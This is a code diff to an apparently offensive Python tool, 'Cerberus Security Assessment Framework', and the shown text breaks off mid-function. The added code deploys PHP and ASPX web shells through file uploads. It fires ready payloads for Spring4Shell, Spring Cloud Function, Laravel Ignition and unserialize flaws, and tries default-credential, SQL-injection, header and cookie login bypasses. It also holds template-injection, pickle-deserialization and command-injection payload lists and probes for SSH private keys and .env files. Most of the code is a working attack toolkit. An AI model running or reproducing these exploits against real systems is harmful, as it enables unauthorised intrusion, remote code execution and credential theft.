@@ -8,7 +8,7 @@
 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
  ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
                                                                                                                           
-     Cerberus Security Assessment Framework v5.1 - Enhanced
+     Cerberus Security Assessment Framework 
            by: ek0ms savi0r
 """
 
@@ -30,6 +30,7 @@ import urllib3
 import threading
 import readline
 import concurrent.futures
+import re
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -49,27 +50,441 @@ class Colors:
     CYAN = '\033[96m'
     END = '\033[0m'
 
+class WebShellDeployer:
+    """Advanced web shell deployment and management"""
+    
+    def __init__(self, target: str, port: int):
+        self.target = target
+        self.port = port
+        self.session = requests.Session()
+        self.deployed_shells = []
+        
+    def deploy_php_shell(self, upload_url: str = None) -> str:
+        """Deploy PHP web shell with multiple techniques"""
+        php_shells = {
+            'basic': "<?php system($_REQUEST['cmd']); ?>",
+            'advanced': "<?php if(isset($_REQUEST['c'])){ system($_REQUEST['c']); } ?>",
+            'obfuscated': "<?php @eval($_POST['cerberus']); ?>",
+            'mini': "<?=`$_GET[0]`?>",
+            'base64': "<?php eval(base64_decode($_REQUEST['e'])); ?>"
+        }
+        
+        # Try multiple deployment methods
+        deployment_methods = [
+            self._deploy_via_upload,
+            self._deploy_via_file_write,
+            self._deploy_via_log_poisoning,
+            self._deploy_via_template_injection
+        ]
+        
+        for method in deployment_methods:
+            for name, shell_code in php_shells.items():
+                shell_url = method(shell_code, name)
+                if shell_url:
+                    print(f"{Colors.GREEN}[+] PHP WebShell deployed: {shell_url}{Colors.END}")
+                    self.deployed_shells.append(shell_url)
+                    return shell_url
+        return None
+    
+    def _deploy_via_upload(self, shell_code: str, name: str) -> str:
+        """Deploy shell via file upload vulnerabilities"""
+        upload_endpoints = [
+            f"http://{self.target}:{self.port}/upload",
+            f"http://{self.target}:{self.port}/admin/upload",
+            f"http://{self.target}:{self.port}/file/upload",
+            f"http://{self.target}:{self.port}/image/upload"
+        ]
+        
+        for endpoint in upload_endpoints:
+            try:
+                files = {
+                    'file': (f'{name}.php', shell_code, 'application/x-php'),
+                    'upload': (None, 'Submit'),
+                    'file_upload': (None, '1')
+                }
+                
+                response = self.session.post(
+                    endpoint,
+                    files=files,
+                    timeout=5,
+                    verify=False
+                )
+                
+                if response.status_code == 200:
+                    # Try to guess the uploaded file location
+                    possible_locations = [
+                        f"http://{self.target}:{self.port}/uploads/{name}.php",
+                        f"http://{self.target}:{self.port}/upload/{name}.php",
+                        f"http://{self.target}:{self.port}/images/{name}.php",
+                        f"http://{self.target}:{self.port}/files/{name}.php"
+                    ]
+                    
+                    for location in possible_locations:
+                        test_response = self.session.get(location, timeout=3)
+                        if test_response.status_code == 200:
+                            return location
+                            
+            except:
+                continue
+        return None
+    
+    def _deploy_via_file_write(self, shell_code: str, name: str) -> str:
+        """Deploy shell via file write vulnerabilities"""
+        # This would require command execution first
+        return None
+    
+    def deploy_asp_shell(self) -> str:
+        """Deploy ASP/X web shells"""
+        asp_shells = {
+            'basic': '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process.Start(Request["cmd"]); %>',
+            'cmd': '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>'
+        }
+        
+        for name, shell_code in asp_shells.items():
+            upload_endpoints = [
+                f"http://{self.target}:{self.port}/upload.aspx",
+                f"http://{self.target}:{self.port}/upload"
+            ]
+            
+            for endpoint in upload_endpoints:
+                try:
+                    files = {'file': (f'{name}.aspx', shell_code, 'application/x-aspx')}
+                    response = self.session.post(endpoint, files=files, timeout=5)
+                    
+                    if response.status_code == 200:
+                        shell_url = f"http://{self.target}:{self.port}/uploads/{name}.aspx"
+                        test_response = self.session.get(shell_url, timeout=3)
+                        if test_response.status_code == 200:
+                            return shell_url
+                except:
+                    continue
+        return None
+
+class FrameworkExploiter:
+    """Framework-specific exploitation modules"""
+    
+    def __init__(self, target: str, port: int):
+        self.target = target
+        self.port = port
+        self.session = requests.Session()
+        
+    def exploit_spring_rce(self) -> bool:
+        """Spring Framework RCE exploits"""
+        print(f"{Colors.CYAN}[>] Testing Spring Framework RCE...{Colors.END}")
+        
+        spring_payloads = [
+            # Spring4Shell (CVE-2022-22965)
+            {'class.module.classLoader.resources.context.parent.pipeline.first.pattern': '%{c2}i'},
+            {'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT'},
+            
+            # Spring Cloud Function SpEL (CVE-2022-22963)
+            {'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("whoami")'},
+            
+            # Spring Data Commons (CVE-2018-1273)
+            {'username': '#{T(java.lang.Runtime).getRuntime().exec("whoami")}'}
+        ]
+        
+        endpoints = [
+            f"http://{self.target}:{self.port}/",
+            f"http://{self.target}:{self.port}/api/users",
+            f"http://{self.target}:{self.port}/admin",
+            f"http://{self.target}:{self.port}/functionRouter"
+        ]
+        
+        for endpoint in endpoints:
+            for payload in spring_payloads:
+                try:
+                    response = self.session.post(endpoint, data=payload, timeout=3)
+                    if any(indicator in response.text for indicator in ['root', 'admin', 'uid=']):
+                        print(f"{Colors.GREEN}[+] Spring RCE successful at {endpoint}{Colors.END}")
+                        return True
+                except:
+                    continue
+        return False
+    
+    def exploit_laravel_rce(self) -> bool:
+        """Laravel Framework RCE exploits"""
+        print(f"{Colors.CYAN}[>] Testing Laravel RCE...{Colors.END}")
+        
+        # Laravel debug mode RCE
+        debug_url = f"http://{self.target}:{self.port}/_ignition/execute-solution"
+        payload = {
+            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
+            "parameters": {
+                "variableName": "username",
+                "viewFile": "php://filter/convert.base64-encode/resource=/etc/passwd"
+            }
+        }
+        
+        try:
+            response = self.session.post(debug_url, json=payload, timeout=3)
+            if "root:" in response.text:
+                print(f"{Colors.GREEN}[+] Laravel debug RCE successful{Colors.END}")
+                return True
+        except:
+            pass
+        
+        # Laravel token unserialize RCE
+        token_payload = "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\0*\0events\";O:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"\0*\0queueResolver\";s:6:\"system\";}s:8:\"\0*\0event\";s:8:\"whoami\";}"
+        try:
+            response = self.session.get(
+                f"http://{self.target}:{self.port}/",
+                cookies={'laravel_session': token_payload},
+                timeout=3
+            )
+            if "root" in response.text or "www-data" in response.text:
+                print(f"{Colors.GREEN}[+] Laravel token unserialize RCE successful{Colors.END}")
+                return True
+        except:
+            pass
+        
+        return False
+    
+    def exploit_wordpress_rce(self) -> bool:
+        """WordPress-specific RCE exploits"""
+        print(f"{Colors.CYAN}[>] Testing WordPress RCE...{Colors.END}")
+        
+        # Test for vulnerable plugins
+        vulnerable_plugins = {
+            'revslider': '/wp-content/plugins/revslider/temp/update_extract/revslider/rs.php',
+            'formidable': '/wp-admin/admin-ajax.php?action=frm_forms_preview&form=1'
+        }
+        
+        for plugin, endpoint in vulnerable_plugins.items():
+            try:
+                url = f"http://{self.target}:{self.port}{endpoint}"
+                response = self.session.get(url, timeout=3)
+                if response.status_code == 200:
+                    print(f"{Colors.YELLOW}[!] Potentially vulnerable WordPress plugin: {plugin}{Colors.END}")
+                    return True
+            except:
+                continue
+        return False
+
+class AuthBypasser:
+    """Advanced authentication bypass techniques"""
+    
+    def __init__(self, target: str, port: int):
+        self.target = target
+        self.port = port
+        self.session = requests.Session()
+        
+    def bypass_login(self, login_url: str) -> bool:
+        """Attempt multiple authentication bypass techniques"""
+        print(f"{Colors.CYAN}[>] Attempting authentication bypass on {login_url}{Colors.END}")
+        
+        techniques = [
+            self._default_credentials,
+            self._sql_injection_auth,
+            self._parameter_pollution,
+            self._header_injection,
+            self._cookie_manipulation 
+        ]
+        
+        for technique in techniques:
+            if technique(login_url):
+                return True
+        return False
+    
+    def _default_credentials(self, login_url: str) -> bool:
+        """Try common default credentials"""
+        credentials = [
+            ('admin', 'admin'),
+            ('admin', 'password'),
+            ('admin', '123456'),
+            ('admin', 'admin123'),
+            ('root', 'root'),
+            ('root', 'password'),
+            ('test', 'test'),
+            ('guest', 'guest'),
+            ('administrator', 'password'),
+            ('admin', '')
+        ]
+        
+        for username, password in credentials:
+            try:
+                data = {
+                    'username': username,
+                    'password': password,
+                    'email': username,
+                    'user': username,
+                    'login': 'Login'
+                }
+                
+                response = self.session.post(login_url, data=data, timeout=3)
+                if any(indicator in response.text.lower() for indicator in ['dashboard', 'welcome', 'logout', 'success']):
+                    print(f"{Colors.GREEN}[+] Default credentials worked: {username}:{password}{Colors.END}")
+                    return True
+            except:
+                continue
+        return False
+    
+    def _sql_injection_auth(self, login_url: str) -> bool:
+        """SQL injection in authentication"""
+        sql_payloads = [
+            {"username": "' OR '1'='1'--", "password": "anything"},
+            {"username": "admin'--", "password": "anything"},
+            {"username": "admin'/*", "password": "anything"},
+            {"username": "' OR 1=1--", "password": "anything"},
+            {"email": "' OR '1'='1'--", "password": "anything"}
+        ]
+        
+        for payload in sql_payloads:
+            try:
+                response = self.session.post(login_url, data=payload, timeout=3)
+                if any(indicator in response.text.lower() for indicator in ['dashboard', 'welcome', 'logout']):
+                    print(f"{Colors.GREEN}[+] SQL injection auth bypass successful{Colors.END}")
+                    return True
+            except:
+                continue
+        return False
+    
+    def _parameter_pollution(self, login_url: str) -> bool:
+        """HTTP parameter pollution attacks"""
+        pollution_payloads = [
+            {"username": "admin", "username": "test", "password": "admin"},
+            {"user": "admin", "username": "admin", "password": "password"},
+            {"email": "admin@admin.com", "username": "admin", "password": "password"}
+        ]
+        
+        for payload in pollution_payloads:
+            try:
+                response = self.session.post(login_url, data=payload, timeout=3)
+                if response.status_code == 302 or 'dashboard' in response.text.lower():
+                    print(f"{Colors.GREEN}[+] Parameter pollution auth bypass successful{Colors.END}")
+                    return True
+            except:
+                continue
+        return False
+
+    def _header_injection(self, login_url: str) -> bool:
+        """Header injection authentication bypass"""
+        headers_payloads = [
+            {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
+            {'X-Original-URL': '/admin', 'X-Rewrite-URL': '/admin'},
+            {'User-Agent': 'Googlebot/2.1'},
+            {'Referer': 'http://127.0.0.1/admin'}
+        ]
+    
+        for headers in headers_payloads:
+            try:
+                response = self.session.post(login_url, data={'username': 'admin', 'password': 'admin'}, 
+                                           headers=headers, timeout=3)
+                if response.status_code == 302 or 'dashboard' in response.text.lower():
+                    print(f"{Colors.GREEN}[+] Header injection auth bypass successful{Colors.END}")
+                    return True
+            except:
+                continue
+        return False
+
+    def _cookie_manipulation(self, login_url: str) -> bool:
+        """Cookie manipulation authentication bypass"""
+        cookie_payloads = [
+            {'admin': 'true', 'authenticated': '1', 'logged_in': 'true'},
+            {'user': 'admin', 'role': 'admin', 'access_level': 'admin'},
+            {'is_admin': '1', 'auth': 'true', 'login': 'success'}
+        ]
+    
+        for cookies in cookie_payloads:
+            try:
+                self.session.cookies.update(cookies)
+                response = self.session.get(login_url, timeout=3)
+                if 'dashboard' in response.text.lower() or response.status_code == 302:
+                    print(f"{Colors.GREEN}[+] Cookie manipulation auth bypass successful{Colors.END}")
+                    return True
+            except:
+                continue
+        return False
+    
+class AdvancedRCEExploiter:
+    """Advanced RCE exploitation with multiple techniques"""
+    
+    def __init__(self, target: str, port: int):
+        self.target = target
+        self.port = port
+        self.session = requests.Session()
+        self.webshell_deployer = WebShellDeployer(target, port)
+        self.framework_exploiter = FrameworkExploiter(target, port)
+        self.auth_bypasser = AuthBypasser(target, port)
+        
+    def comprehensive_rce_attack(self, endpoint: str = None) -> str:
+        """Launch comprehensive RCE attack using all techniques"""
+        print(f"{Colors.CYAN}[>] Starting comprehensive RCE attack...{Colors.END}")
+        
+        # Method 1: Framework-specific exploits
+        if self.framework_exploiter.exploit_spring_rce():
+            return "Spring RCE"
+        if self.framework_exploiter.exploit_laravel_rce():
+            return "Laravel RCE"
+        if self.framework_exploiter.exploit_wordpress_rce():
+            return "WordPress RCE"
+        
+        # Method 2: Web shell deployment
+        shell_url = self.webshell_deployer.deploy_php_shell()
+        if shell_url:
+            return f"WebShell deployed: {shell_url}"
+        
+        # Method 3: Authentication bypass + admin RCE
+        admin_endpoints = [
+            f"http://{self.target}:{self.port}/admin",
+            f"http://{self.target}:{self.port}/administrator",
+            f"http://{self.target}:{self.port}/wp-admin"
+        ]
+        
+        for admin_url in admin_endpoints:
+            if self.auth_bypasser.bypass_login(admin_url):
+                # Now try RCE from admin panel
+                rce_result = self._admin_panel_rce(admin_url)
+                if rce_result:
+                    return f"Admin RCE: {rce_result}"
+        
+        return "No RCE method successful"
+    
+    def _admin_panel_rce(self, admin_url: str) -> str:
+        """Attempt RCE through admin panel functionality"""
+        rce_vectors = [
+            {'page': '<?php system($_GET["cmd"]); ?>', 'template': '<?php system($_GET["cmd"]); ?>'},
+            {'command': 'whoami', 'cmd': 'whoami', 'exec': 'whoami'},
+            {'file': '../../../../../../etc/passwd', 'path': '../../../../../../etc/passwd'}
+        ]
+        
+        for vector in rce_vectors:
+            try:
+                response = self.session.post(admin_url, data=vector, timeout=3)
+                if 'root:' in response.text or 'www-data' in response.text:
+                    return "Admin panel RCE successful"
+            except:
+                continue
+        return None
+
+# =============================================================================
+# ENHANCED: IntelligentRCEExploiter with Advanced Capabilities
+# =============================================================================
+
 class IntelligentRCEExploiter:
-    """Smart RCE exploitation focusing on found endpoints"""
+    """Enhanced RCE exploitation with advanced techniques"""
     
     def __init__(self, target: str, port: int):
         self.target = target
         self.port = port
         self.session = requests.Session()
         self.found_endpoints = []
+        self.advanced_exploiter = AdvancedRCEExploiter(target, port)
         
     def exploit_found_endpoint(self, endpoint: str, command: str) -> str:
-        """Intelligently exploit discovered RCE endpoints"""
-        print(f"{Colors.GREEN}[+] EXPLOITING FOUND ENDPOINT: {endpoint}{Colors.END}")
+        """Intelligently exploit discovered RCE endpoints with advanced techniques"""
+        print(f"{Colors.GREEN}[+] ADVANCED EXPLOITATION: {endpoint}{Colors.END}")
         
         url = f"http://{self.target}:{self.port}{endpoint}"
         
-        # Try different exploitation techniques for this specific endpoint
+        # Enhanced exploitation techniques
         exploitation_methods = [
-            self._exploit_json_rpc,
-            self._exploit_rest_api,
-            self._exploit_command_injection,
-            self._exploit_direct_execution
+            self._exploit_advanced_json_rpc,
+            self._exploit_rest_api_with_auth,
+            self._exploit_command_injection_advanced,
+            self._exploit_deserialization,
+            self._exploit_template_injection,
+            self._exploit_advanced_rest_api
         ]
         
         for method in exploitation_methods:
@@ -77,19 +492,33 @@ class IntelligentRCEExploiter:
             if result and "Command execution failed" not in result:
                 return result
         
-        return f"{Colors.RED}[-] Endpoint exploitation failed: {endpoint}{Colors.END}"
+        # Try comprehensive attack if specific endpoint fails
+        if '/admin' in endpoint:
+            print(f"{Colors.CYAN}[>] Attempting comprehensive admin RCE attack...{Colors.END}")
+            result = self.advanced_exploiter.comprehensive_rce_attack(endpoint)
+            if "successful" in result.lower():
+                return f"Comprehensive attack: {result}"
+        
+        return f"{Colors.RED}[-] Advanced exploitation failed: {endpoint}{Colors.END}"
     
-    def _exploit_json_rpc(self, url: str, command: str) -> str:
-        """Exploit JSON-RPC style endpoints"""
-        payloads = [
-            {"command": command, "cmd": command, "exec": command},
-            {"query": command, "input": command, "system": command},
-            {"data": {"command": command}, "execute": True},
-            {"method": "exec", "params": [command]},
-            {"cmd": command, "action": "execute"}
+    def _exploit_advanced_json_rpc(self, url: str, command: str) -> str:
+        """Advanced JSON-RPC exploitation"""
+        advanced_payloads = [
+            # PHP deserialization
+            {"__PHP_INJECTION__": f'O:8:"stdClass":1:{{s:3:"cmd";s:{len(command)}:"{command}";}}'},
+            
+            # Java deserialization
+            {"@type": "java.lang.Runtime", "exec": command},
+            
+            # Node.js RCE
+            {"constructor": {"prototype": {"polluted": "rce"}}, "command": command},
+            
+            # Complex nested objects
+            {"data": {"__proto__": {"command": command}}, "execute": True},
+            {"query": {"$where": f"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('{command}')"}}
         ]
         
-        for payload in payloads:
+        for payload in advanced_payloads:
             try:
                 response = self.session.post(
                     url,
@@ -99,84 +528,204 @@ class IntelligentRCEExploiter:
                     headers={'Content-Type': 'application/json'}
                 )
                 if self._is_successful_execution(response, command):
-                    return response.text
+                    return f"JSON-RPC: {response.text}"
             except:
                 continue
         return None
     
-    def _exploit_rest_api(self, url: str, command: str) -> str:
-        """Exploit REST API endpoints"""
-        # Try different HTTP methods
-        methods = ['POST', 'GET', 'PUT']
+    def _exploit_deserialization(self, url: str, command: str) -> str:
+        """Deserialization attack vectors"""
+        # PHP deserialization
+        php_payload = f'O:8:"stdClass":1:{{s:3:"cmd";s:{len(command)}:"{command}";}}'
         
-        for method in methods:
-            try:
-                if method == 'POST':
-                    data_payloads = {
-                        'command': command, 'cmd': command, 'exec': command,
-                        'query': command, 'input': command, 'system': command
-                    }
-                    for param, value in data_payloads.items():
-                        response = self.session.post(
-                            url,
-                            data={param: value},
-                            timeout=5,
-                            verify=False
-                        )
-                        if self._is_successful_execution(response, command):
-                            return response.text
-                
-                elif method == 'GET':
-                    response = self.session.get(
-                        f"{url}?command={command}",
-                        timeout=5,
-                        verify=False
-                    )
-                    if self._is_successful_execution(response, command):
-                        return response.text
-                        
-            except:
-                continue
-        return None
-    
-    def _exploit_direct_execution(self, url: str, command: str) -> str:
-        """Direct command execution attempts"""
-        direct_payloads = [
-            f"127.0.0.1; {command}",
-            f"localhost | {command}",
-            f"$({{{command}}})",
-            f"`{command}`"
-        ]
+        # Java deserialization (simplified)
+        java_payload = base64.b64encode(b'\xac\xed\x00\x05').decode() + '...'
         
-        for payload in direct_payloads:
+        # Python pickle
+        python_payload = base64.b64encode(
+            f'c__builtin__\neval\n(c__builtin__\ncompile\n(S"{command}"\nS""\nS"exec")\ntR.'.encode()
+        ).decode()
+        
+        deserialization_payloads = {
+            'data': php_payload,
+            'input': php_payload,
+            'object': java_payload,
+            'serialized': php_payload,
+            'pickle': python_payload
+        }
+        
+        for param, payload in deserialization_payloads.items():
             try:
                 response = self.session.post(
                     url,
-                    data={'ip': payload, 'host': payload, 'target': payload},
+                    data={param: payload},
                     timeout=5,
                     verify=False
                 )
                 if self._is_successful_execution(response, command):
-                    return response.text
+                    return f"Deserialization: {response.text}"
+            except:
+                continue
+        return None
+    
+    def _exploit_template_injection(self, url: str, command: str) -> str:
+        """Template injection attacks"""
+        template_payloads = {
+            'SSTI': {
+                'template': f'${{7*7}}',
+                'name': f'${{"a".getClass().forName("java.lang.Runtime").getRuntime().exec("{command}")}}',
+                'input': f'{{{{"".__class__.__mro__[1].__subclasses__()[396]("{command}",shell=True)}}}}',
+                'query': f'#{{7*7}}'
+            },
+            'Jinja2': {
+                'template': '{{ config.items() }}',
+                'name': f'{{{{ cycler.__init__.__globals__.os.popen("{command}").read() }}}}'
+            },
+            'Twig': {
+                'template': '{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}'
+            }
+        }
+        
+        for engine, payloads in template_payloads.items():
+            for param, payload in payloads.items():
+                try:
+                    response = self.session.post(
+                        url,
+                        data={param: payload},
+                        timeout=5,
+                        verify=False
+                    )
+                    if self._is_successful_execution(response, command):
+                        return f"Template Injection ({engine}): {response.text}"
+                except:
+                    continue
+        return None
+    
+    def _exploit_command_injection_advanced(self, url: str, command: str) -> str:
+        """Advanced command injection techniques"""
+        # Enhanced payload sets for different environments
+        windows_payloads = [
+            f"& {command}",
+            f"| {command}",
+            f"|| {command}",
+            f"^ {command}",
+            f"cmd /c {command}",
+            f"powershell -c {command}",
+            f"wmic process call create '{command}'",
+            f"for /f %i in ('{command}') do echo %i"
+        ]
+        
+        linux_payloads = [
+            f";{command}",
+            f"|{command}",
+            f"||{command}",
+            f"&&{command}",
+            f"`{command}`",
+            f"$({command})",
+            f"{{{{{command}}}}}",
+            f"\n{command}\n",
+            f"127.0.0.1;{command}",
+            f"localhost|{command}",
+            f"/bin/sh -c '{command}'",
+            f"bash -c '{command}'",
+            f"python -c \"import os; os.system('{command}')\"",
+            f"perl -e 'system \"{command}\"'",
+            f"php -r \"system('{command}');\""
+        ]
+        
+        all_payloads = windows_payloads + linux_payloads
+        
+        injection_points = {
+            'ip': '127.0.0.1',
+            'host': 'localhost',
+            'target': '127.0.0.1',
+            'domain': 'example.com',
+            'url': 'http://example.com',
+            'file': 'test.txt',
+            'path': '/tmp/test',
+            'username': 'test',
+            'email': 'test@test.com'
+        }
+        
+        for payload in all_payloads:
+            for param, value in injection_points.items():
+                try:
+                    injected_value = f"{value}{payload}"
+                    response = self.session.post(
+                        url,
+                        data={param: injected_value},
+                        timeout=3,
+                        verify=False
+                    )
+                    if self._is_successful_execution(response, command):
+                        return f"Command Injection: {response.text}"
+                except:
+                    continue
+        return None
+    
+    def _exploit_rest_api_with_auth(self, url: str, command: str) -> str:
+        """REST API exploitation with authentication bypass attempts"""
+        # First try without auth
+        methods = ['POST', 'GET', 'PUT', 'PATCH', 'DELETE']
+        
+        for method in methods:
+            try:
+                if method == 'POST':
+                    # Enhanced parameter list
+                    enhanced_params = {
+                        'command': command, 'cmd': command, 'exec': command,
+                        'query': command, 'input': command, 'system': command,
+                        'run': command, 'execute': command, 'shell': command,
+                        'code': f'system("{command}");',
+                        'data': f'<?php system("{command}"); ?>',
+                        'script': f'print(os.system("{command}"))'
+                    }
+                    
+                    for param, value in enhanced_params.items():
+                        response = self.session.post(
+                            url,
+                            data={param: value},
+                            timeout=3,
+                            verify=False,
+                            headers={'X-Forwarded-For': '127.0.0.1'}
+                        )
+                        if self._is_successful_execution(response, command):
+                            return f"REST API: {response.text}"
+                
+                elif method == 'GET':
+                    # URL parameter injection
+                    get_params = {
+                        'cmd': command, 'command': command, 'exec': command,
+                        'code': command, 'system': command
+                    }
+                    
+                    for param, value in get_params.items():
+                        test_url = f"{url}?{param}={requests.utils.quote(value)}"
+                        response = self.session.get(test_url, timeout=3, verify=False)
+                        if self._is_successful_execution(response, command):
+                            return f"REST API GET: {response.text}"
+                            
             except:
                 continue
         return None
     
     def _is_successful_execution(self, response, command: str) -> bool:
         """Enhanced execution success detection"""
-        if response.status_code != 200:
+        if response.status_code not in [200, 201, 302]:
             return False
             
         content = response.text.lower()
         
-        # Strong indicators of success
+        # Enhanced success indicators
         success_indicators = [
             'root', 'user', 'admin', 'uid=', 'gid=', '/home/', '/root/',
-            'linux', 'windows', 'system32', 'etc/passwd'
+            'linux', 'windows', 'system32', 'etc/passwd', 'www-data',
+            'nt authority\\system', 'c:\\windows', 'program files',
+            'cerberus_test', 'success', 'completed'
         ]
         
         # Command-specific validation
-        if 'whoami' in command and any(indicator in content for indicator in ['root', 'user', 'admin']):
+        if 'whoami' in command and any(indicator in content for indicator in ['root', 'user', 'admin', 'www-data']):
             return True
         if 'id' in command and any(indicator in content for indicator in ['uid=', 'gid=']):
             return True
@@ -184,68 +733,99 @@ class IntelligentRCEExploiter:
             return True
         if 'echo cerberus_test' in command and 'cerberus_test' in content:
             return True
+        if 'hostname' in command and len(content.strip()) < 50:
+            return True
             
         return any(indicator in content for indicator in success_indicators)
 
 # =============================================================================
-# NEW: Service-Specific Exploiter Class
+# ENHANCED: ServiceSpecificExploiter with Advanced Techniques
 # =============================================================================
 
 class ServiceSpecificExploiter:
-    """Service-specific exploitation based on port scanning"""
+    """Enhanced service-specific exploitation"""
     
     def __init__(self, target: str):
         self.target = target
+        self.auth_bypasser = AuthBypasser(target, 80)  # Default port
         
     def exploit_service(self, port: int, service: str):
-        """Exploit specific services based on port"""
-        print(f"{Colors.CYAN}[>] Exploiting {service} on port {port}{Colors.END}")
+        """Exploit specific services based on port with advanced techniques"""
+        print(f"{Colors.CYAN}[>] ADVANCED exploitation: {service} on port {port}{Colors.END}")
         
         if port == 21:
-            return self._exploit_ftp()
+            return self._exploit_ftp_advanced()
         elif port == 22:
-            return self._exploit_ssh()
+            return self._exploit_ssh_advanced()
         elif port == 23:
             return self._exploit_telnet()
         elif port == 53:
-            return self._exploit_dns()
+            return self._exploit_dns_advanced()
         elif port == 80 or port == 443:
-            return self._exploit_web(port)
+            return self._exploit_web_advanced(port)
         elif port == 445:
-            return self._exploit_smb()
+            return self._exploit_smb_advanced()
         elif port == 3389:
-            return self._exploit_rdp()
+            return self._exploit_rdp_advanced()
         else:
-            return self._exploit_generic(port, service)
+            return self._exploit_generic_advanced(port, service)
     
-    def _exploit_web(self, port: int):
-        """Enhanced web service exploitation"""
+    def _exploit_web_advanced(self, port: int):
+        """Advanced web service exploitation"""
         protocols = ['http', 'https'] if port == 443 else ['http']
         
         for protocol in protocols:
             base_url = f"{protocol}://{self.target}:{port}"
             
-            # Test common web vulnerabilities
+            # Enhanced vulnerability testing
             vulnerabilities = [
-                self._test_directory_traversal(base_url),
-                self._test_file_inclusion(base_url),
-                self._test_backup_files(base_url),
-                self._test_admin_panels(base_url)
+                self._test_directory_traversal_advanced(base_url),
+                self._test_file_inclusion_advanced(base_url),
+                self._test_backup_files_advanced(base_url),
+                self._test_admin_panels_advanced(base_url),
+                self._test_auth_bypass_advanced(base_url)
             ]
             
             if any(vulnerabilities):
                 return True
+                
+            # Try framework-specific exploits
+            framework_exploiter = FrameworkExploiter(self.target, port)
+            if framework_exploiter.exploit_spring_rce():
+                return True
+            if framework_exploiter.exploit_laravel_rce():
+                return True
+            if framework_exploiter.exploit_wordpress_rce():
+                return True
+                
         return False
     
-    def _test_directory_traversal(self, base_url: str) -> bool:
-        """Test for directory traversal vulnerabilities"""
+    def _test_auth_bypass_advanced(self, base_url: str) -> bool:
+        """Test authentication bypass on admin panels"""
+        admin_paths = [
+            '/admin', '/administrator', '/wp-admin', '/login', 
+            '/dashboard', '/control', '/manager', '/admin/login',
+            '/administrator/login', '/wp-login.php'
+        ]
+        
+        for path in admin_paths:
+            login_url = f"{base_url}{path}"
+            if self.auth_bypasser.bypass_login(login_url):
+                print(f"{Colors.GREEN}[+] Authentication bypass successful: {login_url}{Colors.END}")
+                return True
+        return False
+    
+    def _test_directory_traversal_advanced(self, base_url: str) -> bool:
+        """Advanced directory traversal testing"""
         payloads = [
             "../../../../../../../../etc/passwd",
             "....//....//....//....//etc/passwd",
-            "../".join([""]*10) + "etc/passwd"
+            "../".join([""]*10) + "etc/passwd",
+            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%2fpasswd"
         ]
         
-        test_endpoints = ['/files', '/download', '/view', '/image', '/load']
+        test_endpoints = ['/files', '/download', '/view', '/image', '/load', '/file', '/document']
         
         for endpoint in test_endpoints:
             for payload in payloads:
@@ -259,15 +839,18 @@ class ServiceSpecificExploiter:
                     continue
         return False
     
-    def _test_file_inclusion(self, base_url: str) -> bool:
-        """Test for file inclusion vulnerabilities"""
+    def _test_file_inclusion_advanced(self, base_url: str) -> bool:
+        """Advanced file inclusion testing"""
         payloads = [
             "../../../../../../../../etc/passwd",
             "....//....//....//....//etc/passwd",
-            "php://filter/convert.base64-encode/resource=index.php"
+            "php://filter/convert.base64-encode/resource=index.php",
+            "zip://path/to/archive.zip#file.txt",
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+            "expect://whoami"
         ]
         
-        test_endpoints = ['/include', '/load', '/view', '/file']
+        test_endpoints = ['/include', '/load', '/view', '/file', '/page', '/template']
         
         for endpoint in test_endpoints:
             for payload in payloads:
@@ -281,11 +864,14 @@ class ServiceSpecificExploiter:
                     continue
         return False
     
-    def _test_backup_files(self, base_url: str) -> bool:
-        """Test for backup files"""
+    def _test_backup_files_advanced(self, base_url: str) -> bool:
+        """Advanced backup file discovery"""
         backup_files = [
-            '/.git/config', '/backup.zip', '/database.sql', 
-            '/wp-config.php.bak', '/.env.bak', '/config.bak'
+            '/.git/config', '/backup.zip', '/database.sql', '/dump.sql',
+            '/wp-config.php.bak', '/.env.bak', '/config.bak', '/web.config.bak',
+            '/.bash_history', '/.ssh/id_rsa', '/.ssh/id_rsa.pub',
+            '/backup.tar.gz', '/www.zip', '/site.tar', '/admin.bak',
+            '/.DS_Store', '/thumbs.db', '/error.log', '/access.log'
         ]
         
         for backup_file in backup_files:
@@ -293,91 +879,179 @@ class ServiceSpecificExploiter:
                 url = f"{base_url}{backup_file}"
                 response = requests.get(url, timeout=3, verify=False)
                 if response.status_code == 200 and len(response.text) > 0:
-                    print(f"{Colors.GREEN}[+] Backup file found: {url}{Colors.END}")
+                    print(f"{Colors.GREEN}[+] Sensitive file found: {url}{Colors.END}")
                     return True
             except:
                 continue
         return False
     
-    def _test_admin_panels(self, base_url: str) -> bool:
-        """Test for admin panels"""
+    def _test_admin_panels_advanced(self, base_url: str) -> bool:
+        """Advanced admin panel discovery"""
         admin_paths = [
             '/admin', '/administrator', '/wp-admin', '/login', 
-            '/dashboard', '/control', '/manager'
+            '/dashboard', '/control', '/manager', '/webadmin',
+            '/admin.php', '/administrator.php', '/login.php',
+            '/cpanel', '/whm', '/plesk', '/webmin'
         ]
         
         for path in admin_paths:
             try:
                 url = f"{base_url}{path}"
